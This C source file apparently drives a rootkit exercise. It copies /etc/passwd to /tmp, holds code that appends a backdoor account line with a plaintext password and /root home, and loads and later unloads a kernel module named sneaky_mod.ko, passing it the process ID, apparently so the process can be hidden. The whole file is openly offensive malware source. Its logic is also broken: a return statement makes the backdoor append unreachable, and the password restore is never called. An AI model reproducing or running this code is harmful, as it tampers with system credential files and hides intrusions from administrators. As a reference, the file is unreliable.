#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>

// int copy_password_file(char * original_file, char * target_file){
//     char ch;
//     FILE * o_pass = fopen(original_file,"r");
//     FILE * t_pass = fopen(target_file,"w");

//     if(o_pass == NULL){
//         perror("Cannot open original password file!");
//         return 1;
//     }
//     if(t_pass == NULL){
//         perror("Cannot create temp password file!");
//         return 1;
//     }
//     while((ch=fgetc(o_pass))!=EOF){
//         fputc(ch,t_pass);
//     }
//     fclose(o_pass);
//     fclose(t_pass);
//     return 0;
// }


// int execute(char ** argv){
//     pid_t pid;
//     int status;
//     pid = fork();
//     if(pid < 0){
//         perror("fork failed");
//         return 1;
//     }
//     else if(pid == 0){
//         int estatus = execvp(argv[0],argv);
//         if(estatus < 0){
//             printf("failed");
//             perror("execution failed");
//             exit(1);
//         }
//     }
//     else{
//         while(wait(&status)!= pid){
//             ;
//         }
//         return 0;
//     }  
// }

int attack_password_file(){
    char *argv[4];
    argv[0] = "cp";
    argv[1] = "/etc/passwd";
    argv[2] = "/tmp/passwd";
    argv[3] = NULL;
    // printf("1");
    // execute(argv);
    // printf("2");
    pid_t pid;
    int status;
    pid = fork();
    if(pid < 0){
        perror("fork failed");
        return 1;
    }
    else if(pid == 0){
        int estatus = execvp(argv[0],argv);
        if(estatus < 0){
            printf("failed");
            perror("execution failed");
            exit(1);
        }
    }
    else{
        while(wait(&status)!= pid){
            ;
        }
        return 0;
    }  
    // copy_password_file("/etc/passwd","/tmp/passwd");
    FILE * pass = fopen("/etc/passwd","a");
    fprintf(pass,"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(pass);
    return 0;
}

int load_sneaky_module(){
    char sneaky_pid[128];
    char *argv[4];
    pid_t spid = getpid();
    printf("sneaky_process pid = %d\n", spid);
    snprintf(sneaky_pid,sizeof(sneaky_pid),"sneaky_pid=%d",spid);
    argv[0] = "insmod";
    argv[1] = "sneaky_mod.ko";
    argv[2] = sneaky_pid;
    argv[3] = NULL;
    // execute(argv);
    pid_t pid;
    int status;
    pid = fork();
    if(pid < 0){
        perror("fork failed");
        return 1;
    }
    else if(pid == 0){
        int estatus = execvp(argv[0],argv);
        if(estatus < 0){
            printf("failed");
            perror("execution failed");
            exit(1);
        }
    }
    else{
        while(wait(&status)!= pid){
            ;
        }
        return 0;
    }  
    return 0;
}


int remove_sneaky_module(){
    char *argv[3];
    argv[0] = "rmmod";
    argv[1] = "sneaky_mod.ko";
    argv[2] = NULL;
    // execute(argv);
    pid_t pid;
    int status;
    pid = fork();
    if(pid < 0){
        perror("fork failed");
        return 1;
    }
    else if(pid == 0){
        int estatus = execvp(argv[0],argv);
        if(estatus < 0){
            printf("failed");
            perror("execution failed");
            exit(1);
        }
    }
    else{
        while(wait(&status)!= pid){
            ;
        }
        return 0;
    }  
    return 0;
}

int restore_password_file(){
    char *argv[4];
    argv[0] = "cp";
    argv[1] = "/tmp/passwd";
    argv[2] = "/etc/passwd";
    argv[3] = NULL;
    pid_t pid;
    int status;
    pid = fork();
    if(pid < 0){
        perror("fork failed");
        return 1;
    }
    else if(pid == 0){
        int estatus = execvp(argv[0],argv);
        if(estatus < 0){
            printf("failed");
            perror("execution failed");
            exit(1);
        }
    }
    else{
        while(wait(&status)!= pid){
            ;
        }
        return 0;
    }  
}

int main(){
    attack_password_file();
    load_sneaky_module();
    char ch;
    while(1){
        if((ch = getchar())== 'q'){
            break;
        }
        printf("\n");
    }
    remove_sneaky_module();
    // copy_password_file("/tmp/passwd","/etc/passwd");
}
